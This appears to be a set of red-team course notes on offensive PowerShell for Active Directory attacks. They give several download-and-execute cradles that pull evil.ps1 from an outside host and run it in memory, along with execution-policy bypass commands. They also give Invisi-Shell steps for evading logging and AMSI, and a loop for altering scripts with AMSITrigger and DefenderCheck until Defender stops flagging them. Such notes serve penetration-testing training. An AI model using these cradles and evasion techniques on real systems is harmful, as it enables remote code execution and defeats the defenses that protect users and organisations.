- PowerShell is NOT powershell.exe. It is the System.Management.Automation.dll
### PowerShell Scripts and Modules
- Load a PowerShell script using dot sourcing
```
C:\AD\Tools\PowerView.ps1
```
- A module (or a script) can be imported with:
```
Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
```
- All the commands in a module can be listed with:
```
Get-Command -Module <modulename>
```
- Download execute cradle
```
#This will run from memory instaed of disk
iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')
```

```
$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://192.168.230.1/evil.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response
```

```
#PSv3 onwards 
iex (iwr 'http://192.168.230.1/evil.ps1')
```

```
$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://192.168.230.1/evil.ps1',$false);$h.send();iex $h.responseText
```

```
$wr = [System.NET.WebRequest]::Create("http://192.168.230.1/evil.ps1")
$r = $wr.GetResponse()
IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
```
### PowerShell Detections
- System-wide transcription
- Script Block logging
- AntiMalware Scan Interface (AMSI) 
	- Regardless of how we run a script (from memory or disk or any menas), right before execution it will pick up the content and show it to the AV
- Constrained Language Mode (CLM) - Integrated with Applocker and WDAC (Device Guard)

### Execution Policy
- It is NOT a security measure, it is present to prevent user from accidently executing scripts.
- Several ways to bypass
```
powershell -ExecutionPolicy bypass
powershell -c <cmd>
powershell -encodedcommand
$env:PSExecutionPolicyPreference="bypass"
```

### Bypassing PowerShell Security
- We will use [Invisi-Shell](https://github.com/OmerYa/Invisi-Shell) for bypassing the security controls in PowerShell
- Using Invisi-Shell
	- With admin privileges:
	```
	RunWithPathAsAdmin.bat
	```
	- With non-admin privileges:
	```
	RunWithRegistryNonAdmin.bat
	```
	- Type exit from the new PowerShell session to complete the clean-up.

### Bypassing AV Signatures for PowerShell
- We can always load scripts in memory and avoid detection using AMSI bypass.
- We can use the [AMSITrigger](https://github.com/RythmStick/AMSITrigger) or [DefenderCheck](https://github.com/t3hbb/DefenderCheck) to identify code and strings from a binary or script that Windows Defender may flag.
- Simply provide path to the script file to scan it:
```
AmsiTrigger_x64.exe -i C:\AD\Tools\Invoke-PowerShellTcp_Detected.ps1
DefenderCheck.exe PowerUp.ps1
```
- For full obfuscation of PowerShell scripts, see [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
- Steps to avoid signature based detection are pretty simple:
	- Scan using AMSITrigger
	- Modify the detected code snippet
	- Rescan using AMSITrigger
	- Repeat the steps 2 & 3 till we get a result as “AMSI_RESULT_NOT_DETECTED” or “Blank”